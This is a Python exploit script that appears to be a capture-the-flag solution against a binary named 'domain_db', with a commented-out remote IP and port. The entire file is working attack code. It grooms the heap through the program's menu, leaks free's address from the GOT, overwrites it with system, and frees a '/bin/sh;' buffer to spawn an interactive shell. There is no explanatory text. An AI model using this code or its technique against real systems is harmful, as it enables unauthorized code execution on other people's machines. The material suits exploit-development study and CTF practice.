from zio import *
#target = ('119.254.101.197', 10006)
target = './domain_db'
def add_domain(io, name):
  io.read_until('>')
  io.writeline('1')
  io.read_until(':')
  io.writeline(name)
def lookup_domain(io, id):
  io.read_until('>')
  io.writeline('5')
  io.read_until(':')
  io.writeline(str(id))
def edit_domain_name(io, id, new_name):
  io.read_until('>')
  io.writeline('2')
  io.read_until(':')
  io.writeline(str(id))
  io.read_until(':')
  io.writeline(new_name)
def remove_domain(io, id):
  io.read_until('>')
  io.writeline('3')
  io.read_until(':')
  io.writeline(str(id))
def list_domain(io):
  io.read_until('>')
  io.writeline('4')
  io.read_until('<1> ')
  free = l32(io.read(4))
  print hex(free)
  return free
def exp(target):
  io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
  io.gdb_hint()
  add_domain(io, '0' * (0x800 - 16 - 8 - 1 - 4 - 3)+'12') #0 0x804c008 0x804c7f0
  add_domain(io, '0'*0x770) #1 0x804c878 0x804cff0  top=0x804d070
  add_domain(io, '0'*0x1a0) #2
  add_domain(io, '/bin/sh'+'0'*0x88) #3 0x0804d340 0x0804d2a8
  add_domain(io, '0'*0x10) #4 0x0804d3e0
  add_domain(io, '0'*0x5b0) #5
  add_domain(io, '0'*0x770) #6
  add_domain(io, '0'*0x770) #7
  add_domain(io, '0'*0x770) #8
  add_domain(io, '0'*0x770) #9
  add_domain(io, '/bin/sh;'+'0'*(0x770-8)) #10
  remove_domain(io, 1)
  lookup_domain(io, 0)
  remove_domain(io, 2) # top = 0x804d070 unsort=0x804d218
  ptr_addr = 0x0804b0a4
  add_domain(io, '0'*0x90) #1 0x0804d220
  free_got = 0x0804b004
  payload2 = 272*'1' + l32(free_got)
  add_domain(io, payload2)
  free = list_domain(io)
  #local
  system = 0xb7e55060
  #remote
  #system = free - 0x781b0 + 0x3d170
  edit_domain_name(io, 1, l32(system))
  remove_domain(io, 10)
  io.interact()
exp(target)